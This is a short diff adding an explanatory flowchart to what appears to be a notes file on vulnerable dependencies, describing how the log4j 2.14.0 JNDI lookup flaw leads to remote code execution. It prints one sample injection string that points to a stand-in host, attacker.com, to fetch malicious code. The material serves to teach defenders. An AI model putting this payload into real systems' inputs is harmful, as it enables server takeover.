@@ -117,3 +117,15 @@ Attacker can execute arbitrary SQL ❌
         ↓
 Fix → upgrade to 42.3.2 or higher ✅
 ------------------------------------------------------------
+log4j 2.14.0 has a feature called JNDI lookup
+        ↓
+Attacker sends malicious string in any input:
+${jndi:ldap://attacker.com/exploit}
+        ↓
+log4j LOGS this string
+        ↓
+log4j automatically fetches URL from attacker server
+        ↓
+Downloads and EXECUTES malicious code on your server
+        ↓
+Attacker gets full control of your server ❌
